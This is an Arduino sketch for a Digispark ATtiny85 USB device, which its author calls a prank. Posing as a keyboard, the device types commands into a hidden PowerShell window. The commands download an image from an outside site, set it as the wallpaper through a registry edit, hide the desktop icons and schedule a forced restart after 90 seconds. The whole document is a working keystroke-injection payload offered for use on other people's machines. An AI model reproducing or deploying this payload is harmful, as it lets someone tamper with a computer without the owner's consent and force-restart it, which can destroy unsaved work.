//PRANK BY DARKL0RD
//Script for Digispark Attiny85 (This Script uses powershell to chaange wallpapper & hides all desktop icons)
//(Then its sets a restart timer for 90s)
#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:
  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -WindowStyle Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("$client.DownloadFile(\"https://i.imgflip.com/1dv8ac.jpg\" , \"1dv8ac.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\1dv8ac.jpg\" /f");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
    // sets the background, and closes.
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(101);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("v");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("d");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  //DigiKeyboard.print("cmd /c Shutdown /l");
  DigiKeyboard.print("cmd /c Shutdown /r /f /t 90");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  // The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
  // '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'

  DigiKeyboard.delay(500);

  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
  delay(1000);               // wait for a second
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
  delay(1000);               // wait for a second
// I know its basic but tell what you think im only 21 and this is my first "script" thanks DarkLord
    for (;;) {
    /*empty*/
    }
}
